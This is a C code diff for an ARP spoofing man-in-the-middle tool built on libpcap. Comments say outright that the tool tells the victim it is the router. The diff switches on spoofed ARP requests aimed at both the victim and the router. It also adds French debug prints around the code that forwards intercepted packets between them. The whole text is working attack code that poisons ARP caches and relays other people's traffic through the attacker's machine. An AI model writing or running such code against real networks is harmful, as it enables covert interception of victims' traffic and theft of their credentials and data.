@@ -82,6 +82,9 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	char *ip_router_string;
 	char *mac_router_string;
 	char *my_mac;
+	eth_addr_t null_addr;
+
+	memset(&null_addr, 0x0, ETH_ADDR_LEN);
 
 	// We retrieve the mac & ip address of the router (as strings)
 	ip_router_string = strtok(arguments, ";");
@@ -149,9 +152,9 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 			// we answer our mac addr to the victim, we tell him we are the router
 			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
 			// we ask the victim what is it's mac addr, saying we are the router
-			//arp_request(eth_pack.eth_src, arp_payload.ar_spa, my_mac_addr, router_ip_addr);
+			arp_request(eth_pack.eth_src, my_mac_addr, my_mac_addr, (uint8_t *)&router_ip_addr, null_addr, arp_payload.ar_spa);
 			// we ask the router his mac addr, saying we are the victim
-			//arp_request();
+			arp_request(router_mac_addr, my_mac_addr, my_mac_addr, arp_payload.ar_spa, null_addr, (uint8_t *)&router_ip_addr);
 
 		}
 	} else if (type == ETH_TYPE_IP) {
@@ -159,10 +162,14 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		memcpy(&ip_header, packet + sizeof(struct eth_hdr), sizeof(struct ip_hdr));
 
 		if ((memcmp(my_mac_addr.data, eth_pack.eth_dst.data, ETH_ADDR_LEN) == 0) && (ip_header.ip_dst != my_ip_addr)) {
-			if (memcmp(eth_pack.eth_src.data, router_mac_addr.data, ETH_ADDR_LEN) != 0) 
+			printf("On va devoir forward !\n");
+			if (memcmp(eth_pack.eth_src.data, router_mac_addr.data, ETH_ADDR_LEN) != 0) {
+				printf("On forward vers le routeur\n");
 				forward(packet, header->len, router_mac_addr);
-			else
+			} else {
+				printf("On forward vers la victime\n");
 				forward(packet, header->len, victim_mac_addr);
+			}
 		}
 
 	}
